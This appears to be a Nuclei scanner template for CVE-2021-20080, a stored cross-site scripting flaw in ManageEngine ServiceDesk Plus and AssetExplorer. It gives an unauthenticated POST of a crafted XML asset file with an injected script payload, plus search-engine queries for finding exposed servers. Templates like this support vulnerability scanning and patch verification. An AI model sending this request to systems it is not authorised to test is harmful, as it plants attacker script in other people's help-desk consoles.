id: CVE-2021-20080

info:
  name: ManageEngine ServiceDesk Plus and AssetExplorer Unauthenticated Stored XSS
  author: ProjectDiscoveryAI
  severity: medium
  description: Insufficient output sanitization in ManageEngine ServiceDesk Plus before version 11200 and ManageEngine AssetExplorer before version 6800 allows a remote, unauthenticated attacker to conduct persistent cross-site scripting (XSS) attacks by uploading a crafted XML asset file.
  impact: |
    Allows remote attackers to execute malicious scripts in the context of a user's browser
  remediation: |
    Apply the vendor-supplied patch or upgrade to the latest version to mitigate the vulnerability
  reference:
    - https://www.tenable.com/security/research/tra-2021-11
    - https://www.manageengine.com/products/service-desk/on-premises/readme.html#readme112
    - https://www.manageengine.com/products/asset-explorer/sp-readme.html
    - https://github.com/tenable/poc/blob/master/manageengine/manageengine_sdp_unauth_stored_xss_rce_windows.py
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-20080
    cwe-id: CWE-79
    epss-score: 0.03337
    epss-percentile: 0.91661
    cpe: cpe:2.3:a:zohocorp:manageengine_servicedesk_plus:8.1:-:*:*:*:*:*:*
  metadata:
    vendor: zohocorp
    product: manageengine_servicedesk_plus
    shodan-query: http.title:"ManageEngine ServiceDesk Plus"
    fofa-query: title="manageengine servicedesk plus"
    google-query: intitle:"manageengine servicedesk plus"

http:
  - method: POST
    path:
      - "/discoveryServlet/WsDiscoveryServlet"

    headers:
      Content-Type: "application/xml"

    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <DocRoot>
        <ComputerName><command>hostname</command><output><![CDATA[]]></output></ComputerName>
        <OS_Category><command>uname -s</command><output><![CDATA[Darwin]]></output></OS_Category>
        <Hardware_Info>
          <OS_Category><command>sw_vers</command><output><![CDATA[ProductName: macOS ProductVersion: 11.1 BuildVersion: 20C69]]></output></OS_Category>
          <Computer_Information><command>hostname -s</command><output><![CDATA[newworkstation3]]></output></Computer_Information>
          <CPU_Information><command>system_profiler SPHardwareDataType</command><output><![CDATA[Hardware: Hardware Overview: Model Name: MacBook Pro]]></output></CPU_Information>
          <NIC_Info><command>/sbin/ifconfig</command><output><![CDATA[en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500 ether 8c:85:90:d4:a6:e9 inet ');}{alert("xss");// netmask 0xffffff00 broadcast 192.168.0.255]]></output></NIC_Info>
        </Hardware_Info>
        <Software_Info>
          <Installed_Softwares><command>system_profiler SPApplicationsDataType</command><output><![CDATA[]]></output></Installed_Softwares>
        </Software_Info>
      </DocRoot>
    matchers:
      - type: word
        words:
          - "alert(\"xss\")"
        part: body
